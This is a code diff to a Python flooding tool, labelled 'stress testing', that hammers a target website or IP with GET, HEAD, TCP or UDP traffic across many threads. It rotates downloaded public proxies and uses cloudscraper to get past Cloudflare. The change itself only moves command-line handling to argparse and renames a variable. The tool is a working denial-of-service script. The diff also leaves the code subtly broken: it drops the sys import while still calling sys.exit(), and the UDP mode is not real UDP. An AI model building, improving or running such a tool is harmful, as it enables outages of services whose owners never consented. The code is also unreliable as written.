@@ -4,19 +4,22 @@ import socket
 import threading
 import time
 import requests
-import sys
-import os
+import argparse
 from colorama import Fore, Style, init
 
 init()
 
-print("Layer 7: get, head, cfb")
-print("Layer 4: tcp, udp")
-protocol = input("Enter the method to use:").lower()
+parser = argparse.ArgumentParser(description="Stress testing tool.")
+parser.add_argument("-method", choices=["get", "head", "cfb", "tcp", "udp"], help="Choose the method to use.")
+parser.add_argument("-download", action="store_true", help="Download public proxies.")
+parser.add_argument("-check", action="store_true", help="Check the proxies.")
+args = parser.parse_args()
 
-if protocol in ["get", "head", "cfb"]:
+method = args.method
+
+if method in ["get", "head", "cfb"]:
     url = input("Enter the website URL (including http or https): ")
-elif protocol in ["tcp", "udp"]:
+elif method in ["tcp", "udp"]:
     ip = input("Enter the IP address of the server: ")
     port = int(input("Enter the port number: "))
 
@@ -86,18 +89,18 @@ def check_proxies():
     with open("proxies.txt", "w") as proxy_file:
         proxy_file.write("\n".join(proxy_list))
 
-if "-download" in sys.argv:
+if args.download:
     download_proxies()
     sys.exit()
 
-if "-check" in sys.argv:
+if args.check:
     check_proxies()
     sys.exit()
 
 if use_proxies is None:
     ask_for_proxies()
 
-packet_size = 65507 if protocol == "udp" else 65535
+packet_size = 65507 if method == "udp" else 65535
 
 packet_counter = 0
 packet_counter_lock = threading.Lock()
@@ -105,7 +108,7 @@ packet_counter_lock = threading.Lock()
 def stress_test(thread_id):
     global packet_counter
 
-    if protocol == "cfb":
+    if method == "cfb":
         client = cloudscraper.create_scraper()
     else:
         if use_proxies == "y":
@@ -118,25 +121,25 @@ def stress_test(thread_id):
     start_time = time.time()
     last_print_time = start_time - 9
     if thread_id == 0:
-        if protocol == "cfb":
+        if method == "cfb":
             print(Fore.YELLOW + f"Stress testing started on {url} using Cloudscraper successfully!" + Style.RESET_ALL)
-        elif protocol in ["get", "head"]:
+        elif method in ["get", "head"]:
             print(Fore.YELLOW + f"Stress testing started on {url} with proxies: {use_proxies}" + Style.RESET_ALL)
-        elif protocol in ["tcp", "udp"]:
+        elif method in ["tcp", "udp"]:
             print(Fore.YELLOW + f"Stress testing started on {ip}:{port} with proxies: {use_proxies}" + Style.RESET_ALL)
 
     while time.time() - start_time < duration:
-        if protocol == "cfb":
+        if method == "cfb":
             send_request(client)
             with packet_counter_lock:
                 packet_counter += 1
-        elif protocol in ["get", "head", "tcp", "udp"]:
+        elif method in ["get", "head", "tcp", "udp"]:
             send_packet(client)
             with packet_counter_lock:
                 packet_counter += 1
         if thread_id == 0 and time.time() - last_print_time >= 10:
             with packet_counter_lock:
-                if protocol == "cfb":
+                if method == "cfb":
                     try:
                         response_start_time = time.time()
                         response = client.get(url)
@@ -145,35 +148,35 @@ def stress_test(thread_id):
                         print(Fore.GREEN + f"Website is up. Response time: {response_time} ms." + Style.RESET_ALL)
                     except Exception as e:
                         print(Fore.RED + f"Website is down." + Style.RESET_ALL)
-                elif protocol in ["get", "head"]:
+                elif method in ["get", "head"]:
                     try:
                         response_start_time = time.time()
-                        response = client.get(url) if protocol == "get" else client.head(url)
+                        response = client.get(url) if method == "get" else client.head(url)
                         response_end_time = time.time()
                         response_time = round((response_end_time - response_start_time) * 1000, 2)
                         print(Fore.GREEN + f"Website is up. Response time: {response_time} ms." + Style.RESET_ALL)
                     except Exception as e:
                         print(Fore.RED + f"Website is down." + Style.RESET_ALL)
-                elif protocol in ["tcp", "udp"]:
+                elif method in ["tcp", "udp"]:
                     print(f"Sent {packet_counter} packets to {ip}:{port}")
                 last_print_time = time.time()
 
 def send_request(client):
     try:
-        if protocol == "cfb":
+        if method == "cfb":
             response = client.get(url)
-        elif protocol == "get":
+        elif method == "get":
             response = client.get(url)
-        elif protocol == "head":
+        elif method == "head":
             response = client.head(url)
     except Exception as e:
         pass  # Suppress error messages
 
 def send_packet(client):
     try:
-        if protocol == "tcp":
+        if method == "tcp":
             response = client.get(f"http://{ip}:{port}")
-        elif protocol == "udp":
+        elif method == "udp":
             response = client.get(f"udp://{ip}:{port}")
     except Exception as e:
         pass
